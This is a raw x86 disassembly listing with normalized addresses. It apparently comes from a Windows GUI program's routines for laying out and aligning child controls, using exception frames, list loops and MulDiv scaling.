mov ebx eax
xor eax eax
push ebp
push sub_43770c
push [ fs : eax ]
mov [ fs : eax ] esp
xor edx edx
mov eax ebx
call sub_43420c
push ebx
push sub_4390a4
call sub_41d548
mov [ ebx + 0x18c ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_41fb18
mov esi eax
mov [ ebx + 0x170 ] esi
mov edx [ ebx + 0x70 ]
mov eax esi
call sub_41fcc0
mov [ ebx + 0x1a9 ] 0x1
mov [ ebx + 0x1a0 ] 0xffffffff
mov [ ebx + 0x184 ] 0x3
mov eax [ rw-data ]
cmp [ eax + 0x4 ] 0x11
jne r-xdata
add esp 0xfffffff0
call sub_403470
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_452764
mov edx [ ebp - 0x8 ]
lea eax [ ebx + 0x188 ]
call sub_403ef0
lea eax [ ebx + 0x188 ]
call sub_403e9c
jmp r-xdata
mov [ ebx + 0x1a7 ] 0x0
mov al [ r-xdata ]
mov [ ebx + 0x162 ] al
mov [ ebx + 0x163 ] 0x2
mov [ ebx + 0x164 ] 0x1
mov [ ebx + 0x168 ] 0x1
mov [ ebx + 0x150 ] 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_437713
lea eax [ ebp - 0x8 ]
call sub_403e9c
retn
sub_437713
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov eax ebx
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
call sub_4034c8
pop [ fs : 0x0 ]
add esp 0xc
sub_437738
push ebx
push esi
push edi
call sub_4034d8
mov ebx edx
mov edi eax
mov eax edi
call sub_41c758
cmp [ edi + 0x1a8 ] 0x0
je r-xdata
lea eax [ edi + 0x17c ]
call sub_40575c
mov eax [ edi + 0x178 ]
call sub_403164
cmp [ edi + 0x30 ] 0x0
je r-xdata
mov [ edi + 0x1a8 ] 0x0
xor edx edx
mov eax edi
call sub_432db8
cmp [ edi + 0x180 ] 0x0
je r-xdata
mov dl 0x1
mov eax edi
call sub_4383d8
mov eax edi
call sub_438618
test eax eax
je r-xdata
mov eax edi
mov edx [ eax ]
call [ edx + 0xac ]
mov eax [ edi + 0x170 ]
call sub_403164
mov eax [ edi + 0x18c ]
test eax eax
je r-xdata
mov edx eax
dec edx
mov eax edi
call sub_4385dc
mov esi eax
mov edx esi
mov eax edi
call sub_438444
mov dl 0x1
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x4 ]
mov eax edi
call sub_438618
test eax eax
jne r-xdata
mov edx ebx
and dl 0xfc
mov eax edi
call sub_4342e4
test bl bl
jle r-xdata
call sub_41d5e0
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_4034c0
sub_437808
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x19c ] 0x0
je r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_403134
mov [ ebp - 0xc ] eax
xor ecx ecx
push ebp
push sub_4378cc
push [ fs : ecx ]
mov [ fs : ecx ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x19c ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x8 ] eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
call sub_416cb8
mov ebx [ ebp - 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov ebx [ ebp - 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_403164
retn
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
cmp edx [ ebp - 0x8 ]
jge r-xdata
inc esi
dec ebx
jne r-xdata
mov edx esi
call sub_43baa8
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x19c ]
mov edx esi
call sub_416b18
mov edx [ eax + 0x1a0 ]
test edx edx
jl r-xdata
mov ecx eax
mov eax [ ebp - 0xc ]
call sub_416c0c
mov edx esi
mov eax [ ebp - 0xc ]
call sub_416b18
test eax eax
je r-xdata
sub_4378dc
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_438180
xor eax eax
push ebp
push sub_43791c
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_434548
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_437923
mov eax [ ebp - 0x4 ]
call sub_438188
retn
sub_437923
mov eax [ ebp - 0x4 ]
call sub_437808
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_438fdc
pop ebx
pop ecx
pop ebp
retn
push 0x0
xor ecx ecx
mov edx 0xb011
mov eax [ ebp - 0x4 ]
call sub_4362b4
sub_437958
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x1 ] cl
xor ecx ecx
xor ebx ebx
mov bl [ ebp - 0x1 ]
cmp ebx 0x6
ja r-xdata
mov eax ecx
pop ebx
pop ecx
pop ebp
retn
jmp [ ebx * 4 + jump_table_437973 ]
mov edx [ edx + 0x44 ]
cmp edx [ eax + 0x44 ]
setg cl
jmp r-xdata
mov ecx [ edx + 0x44 ]
add ecx [ edx + 0x4c ]
mov edx [ eax + 0x44 ]
add edx [ eax + 0x4c ]
cmp ecx edx
setle cl
jmp r-xdata
mov edx [ edx + 0x40 ]
cmp edx [ eax + 0x40 ]
setg cl
jmp r-xdata
mov ecx [ edx + 0x40 ]
add ecx [ edx + 0x48 ]
mov edx [ eax + 0x40 ]
add edx [ eax + 0x48 ]
cmp ecx edx
setle cl
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx - 0x4 ]
xchg ecx eax
xchg ecx edx
mov ebx [ eax ]
call [ ebx + 0xa4 ]
mov ecx eax
sub_4379e4
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
push esi
push edi
mov esi ecx
lea edi [ ebp - 0x30 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x90 ] 0x0
je r-xdata
xor eax eax
mov al [ ebp - 0x5 ]
mov al [ eax + rw-data ]
mov edx [ ebp - 0x4 ]
cmp al [ edx + 0x61 ]
je r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x94 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x8 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
sub eax [ edx ]
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x0
jl r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x40 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_43bbec
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
mov [ ebp - 0x14 ] eax
mov al [ ebp - 0x5 ]
add al 0xfd
sub al 0x2
jb r-xdata
lea ecx [ ebp - 0x20 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x30 ]
mov edx [ ebx + 0x4c ]
mov eax [ ebx + 0x48 ]
call sub_4156bc
lea edx [ ebp - 0x40 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebp - 0x38 ]
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0x34 ]
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
mov [ ebp - 0x18 ] eax
mov al [ ebp - 0x5 ]
dec eax
sub al 0x2
jb r-xdata
sub al 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x61 ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x61 ] 0x1
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x61 ] 0x4
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x62 ] 0x1
xor eax eax
push ebp
push sub_437d65
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
mov ecx [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_437d6c
mov eax [ ebp - 0x4 ]
mov [ eax + 0x62 ] 0x0
retn
jmp [ eax * 4 + jump_table_437c7a ]
sub al 0x3
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
sub eax [ edx + 0x4 ]
mov [ ebp - 0x18 ] eax
cmp [ ebp - 0x18 ] 0x0
jl r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x61 ] 0x8
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x90 ]
push eax
mov eax [ ebp - 0x20 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x88 ]
push eax
call MulDiv
mov edx [ ebp - 0x14 ]
sar edx 0x1
jns r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x90 ]
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x88 ]
mov edx [ ebp - 0x20 ]
sub edx eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x90 ]
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x88 ]
mov edx [ ebp - 0x20 ]
sub edx eax
mov [ ebp - 0x14 ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp - 0x18 ]
add [ eax + 0x4 ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp - 0x18 ]
sub [ eax + 0xc ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0xc ]
mov [ ebp - 0x10 ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp - 0x14 ]
add [ eax ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp - 0x14 ]
sub [ eax + 0x8 ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0xc ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x40 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
mov [ ebp - 0x10 ] eax
lea eax [ ebp - 0x10 ]
push eax
lea eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
lea ecx [ ebp - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xa8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax ]
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0x10 ] eax
xor eax eax
mov al [ ebp - 0x5 ]
cmp eax 0x6
ja r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x61 ] 0x2
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x61 ] 0x2
je r-xdata
sub eax edx
mov [ ebp - 0xc ] eax
adc edx 0x0
mov eax [ ebp - 0x4 ]
mov [ eax + 0x62 ] 0x1
xor eax eax
push ebp
push sub_437bdd
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
mov ecx [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x62 ] 0x0
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x94 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8c ]
push eax
call MulDiv
mov edx [ ebp - 0x18 ]
sar edx 0x1
jns r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x94 ]
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x8c ]
mov edx [ ebp - 0x1c ]
sub edx eax
mov [ ebp - 0x10 ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x94 ]
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x8c ]
mov edx [ ebp - 0x1c ]
sub edx eax
mov [ ebp - 0x18 ] edx
jmp r-xdata
sub eax edx
mov [ ebp - 0x10 ] eax
adc edx 0x0
sub_437d6c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
cmp eax [ ebp - 0x14 ]
jne r-xdata
xor edx edx
mov dl [ ebp - 0x5 ]
cmp edx 0x5
ja r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
cmp edx [ ebp - 0x18 ]
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
jmp [ edx * 4 + jump_table_437d9b ]
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x18 ]
sub edx [ eax + 0x4c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
sub [ eax + 0x4 ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x18 ]
sub edx [ eax + 0x4c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
add [ eax + 0xc ] edx
jmp r-xdata
mov edx [ ebp - 0x14 ]
sub edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
sub [ eax ] edx
jmp r-xdata
mov edx [ ebp - 0x14 ]
sub edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
add [ eax + 0x8 ] edx
jmp r-xdata
mov edx [ ebp - 0x14 ]
sub edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
add [ eax + 0x8 ] edx
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x18 ]
sub edx [ eax + 0x4c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
add [ eax + 0xc ] edx
sub_437e24
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x10 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_438618
dec eax
test eax eax
jl r-xdata
test bl bl
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
inc eax
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
cmp bl [ eax + 0x5b ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
cmp [ eax + 0x57 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
inc eax
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x0
inc [ ebp - 0x4 ]
dec [ ebp - 0x8 ]
jne r-xdata
test bl bl
je r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
call sub_4169bc
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
test [ eax + 0x1c ] 0x10
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] bl
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ ebp - 0x4 ]
call sub_416b18
lea ecx [ ebp - 0x18 ]
mov edx ebx
call sub_4379e4
pop ecx
inc [ ebp - 0x4 ]
dec [ ebp - 0x8 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_4385dc
mov edi eax
cmp bl [ edi + 0x5b ]
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp edi [ eax - 0x10 ]
je r-xdata
cmp [ edi + 0x57 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
test [ eax + 0x51 ] 0x4
jne r-xdata
xor esi esi
jmp r-xdata
mov eax [ r-xdata ]
and eax [ edi + 0x50 ]
mov edx [ r-xdata ]
cmp edx eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
cmp esi [ eax + 0x8 ]
jge r-xdata
test [ edi + 0x1c ] 0x10
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov ecx edi
mov edx esi
call sub_416b94
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx esi
call sub_416b18
mov edx eax
mov ecx ebx
mov eax edi
call sub_437958
pop ecx
test al al
je r-xdata
test [ edi + 0x51 ] 0x4
jne r-xdata
inc esi
sub_437f94
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
add edi 0xfffffffc
mov bl 0x1
mov eax [ edi ]
call sub_438618
mov esi eax
dec esi
cmp esi 0x0
jl r-xdata
xor ebx ebx
mov eax [ edi ]
mov edx esi
call sub_4385dc
cmp [ eax + 0x5b ] 0x0
jne r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn
mov eax [ edi ]
mov edx esi
call sub_4385dc
mov dl [ r-xdata ]
cmp dl [ eax + 0x61 ]
jne r-xdata
dec esi
cmp esi 0xffffffff
jne r-xdata
sub_437fe8
push ebp
mov ebp esp
add esp 0xfffffff0
push esi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a8 ] 0x0
je r-xdata
push ebp
call sub_437f94
pop ecx
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a7 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a6 ] 0x0
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x8c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_403134
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_4380c7
push [ fs : eax ]
mov [ fs : eax ] esp
push ebp
mov al 0x1
call sub_437e24
pop ecx
push ebp
mov al 0x2
call sub_437e24
pop ecx
push ebp
mov al 0x3
call sub_437e24
pop ecx
push ebp
mov al 0x4
call sub_437e24
pop ecx
push ebp
mov al 0x5
call sub_437e24
pop ecx
push ebp
mov al 0x6
call sub_437e24
pop ecx
push ebp
xor eax eax
call sub_437e24
pop ecx
mov eax [ ebp - 0x4 ]
mov si 0xffc7
call sub_403360
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_403164
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x17c ] 0x0
je r-xdata
pop esi
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov si 0xffee
call sub_403360
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x17c ]
xor edx edx
mov ecx [ eax ]
call [ ecx + 0x2c ]
sub_4380ec
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_43bbec
test al al
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x8
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x160 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_438180
xor eax eax
push ebp
push sub_438173
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea ecx [ ebp - 0x14 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x90 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
and [ eax + 0x54 ] 0xffef
mov eax [ ebp - 0x4 ]
call sub_438188
retn
mov eax [ ebp - 0x4 ]
or [ eax + 0x54 ] 0x10
jmp r-xdata
sub_4381b0
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403134
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_438275
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_434b10
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
call sub_438618
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov eax [ ebp - 0xc ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43827c
mov eax [ ebp - 0xc ]
call sub_403164
retn
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_4385dc
mov edx eax
mov eax [ ebp - 0xc ]
call sub_4169bc
mov edx [ ebp - 0x8 ]
sub edx [ edi + 0x48 ]
sub edx [ edi + 0x40 ]
mov eax edi
call sub_43487c
push 0x0
mov edx esi
mov eax [ ebp - 0xc ]
call sub_416b18
xor ecx ecx
mov edx 0xb03e
call sub_4362b4
inc esi
dec ebx
jne r-xdata
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_4385dc
mov edi eax
mov eax [ edi + 0x4 ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x4 ]
jne r-xdata
sub_438284
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_438618
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_403134
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
call sub_438180
xor edx edx
push ebp
push sub_43836b
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
call sub_438618
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffc0
call sub_403360
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
jmp r-xdata
inc edi
xor ebx ebx
mov eax [ ebp - 0xc ]
mov ebx [ eax + 0x8 ]
test ebx ebx
jg r-xdata
inc ebx
dec edi
jne r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_4385dc
mov edx eax
mov eax [ ebp - 0xc ]
call sub_4169bc
mov edx ebx
dec edx
mov eax [ ebp - 0xc ]
call sub_416b18
cmp [ eax + 0x5b ] 0x3
jne r-xdata
mov eax [ ebp - 0xc ]
call sub_403164
mov eax [ ebp - 0x4 ]
call sub_438188
retn
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_4385dc
mov al [ eax + 0x5b ]
add al 0xfd
sub al 0x2
jae r-xdata
mov dl 0x3
call sub_434620
mov dl 0x4
call sub_434620
jmp r-xdata
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x8 ]
dec edx
mov eax [ ebp - 0xc ]
call sub_416a08
sub_4383d8
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_44bae0
test eax eax
je r-xdata
pop esi
pop ebx
retn
mov ecx ebx
mov edx esi
call sub_44f804
sub_4383f8
push ebx
push esi
mov ebx edx
mov esi eax
test ebx ebx
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov edx [ r-xdata ]
call sub_4032f0
test al al
je r-xdata
lea eax [ esi + 0x198 ]
mov edx ebx
call sub_433a00
lea eax [ esi + 0x19c ]
mov edx ebx
call sub_433a00
lea eax [ esi + 0x194 ]
mov edx ebx
call sub_433a00
jmp r-xdata
mov [ ebx + 0x30 ] esi
sub_438444
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
mov edx [ r-xdata ]
call sub_4032f0
test al al
je r-xdata
lea eax [ esi + 0x198 ]
mov edx ebx
call sub_433a28
lea eax [ esi + 0x194 ]
mov edx ebx
call sub_433a28
lea eax [ esi + 0x19c ]
mov edx ebx
call sub_433a28
jmp r-xdata
xor eax eax
mov [ ebx + 0x30 ] eax
pop esi
pop ebx
retn
sub_43848c
push ebx
push esi
push edi
mov ebx edx
mov edi eax
mov edx edi
mov eax ebx
mov si 0xfff5
call sub_403360
push 0x1
mov esi ebx
mov ecx esi
mov edx 0xb02c
mov eax edi
call sub_4362b4
mov edx ebx
mov eax edi
call sub_4383f8
test [ ebx + 0x1c ] 0x2
jne r-xdata
push 0x1
mov ecx esi
mov edx 0xb036
mov eax edi
call sub_4362b4
pop edi
pop esi
pop ebx
retn
push 0x0
xor ecx ecx
mov edx 0xb009
mov eax ebx
call sub_4362b4
push 0x0
xor ecx ecx
mov edx 0xb008
mov eax ebx
call sub_4362b4
push 0x0
xor ecx ecx
mov edx 0xb023
mov eax ebx
call sub_4362b4
push 0x0
xor ecx ecx
mov edx 0xb03d
mov eax ebx
call sub_4362b4
mov eax ebx
mov edx [ r-xdata ]
call sub_4032f0
test al al
je r-xdata
mov eax edi
call sub_43bbec
test al al
je r-xdata
push 0x0
xor ecx ecx
mov edx 0xb011
mov eax ebx
call sub_4362b4
mov eax edi
call sub_438fdc
jmp r-xdata
mov edx ebx
mov eax edi
call sub_4380ec
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
sub_438560
push ebx
push esi
push edi
push ebp
mov ebx edx
mov esi eax
push 0x0
mov edi ebx
mov ecx edi
mov edx 0xb036
mov eax esi
call sub_4362b4
mov eax ebx
mov edx [ r-xdata ]
call sub_4032f0
test al al
je r-xdata
mov eax esi
call sub_43bbec
test al al
je r-xdata
mov dl 0x1
mov ebp ebx
mov eax ebp
call sub_4383d8
mov eax ebp
call sub_438e40
jmp r-xdata
mov edx ebx
mov eax esi
call sub_438444
push 0x0
mov ecx edi
mov edx 0xb02c
mov eax esi
call sub_4362b4
mov eax esi
call sub_4381a8
pop ebp
pop edi
pop esi
pop ebx
retn
xor ecx ecx
mov dl [ ebx + 0x57 ]
mov eax ebx
call sub_435554
sub_4385dc
push ebx
push esi
push edi
push ebp
mov edi edx
mov ebx eax
mov ebp [ ebx + 0x198 ]
test ebp ebp
je r-xdata
xor esi esi
mov esi [ ebp + 0x8 ]
jmp r-xdata
mov edx edi
sub edx esi
mov eax [ ebx + 0x19c ]
call sub_416b18
mov edx edi
mov eax ebp
call sub_416b18
jmp r-xdata
cmp esi edi
jle r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
sub_438638
push ebx
push esi
push edi
push ebp
push ecx
mov esi edx
mov [ esp ] eax
mov eax [ esp ]
call sub_438618
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
xor edi edi
inc edi
dec ebx
jne r-xdata
mov edx edi
mov eax [ esp ]
call sub_4385dc
mov ebp eax
mov edx esi
mov eax [ ebp + 0x3c ]
call [ ebp + 0x38 ]
cmp [ esi + 0xc ] 0x0
jne r-xdata
sub_438678
add esp 0xfffffff0
movzx edx dx
mov [ esp ] edx
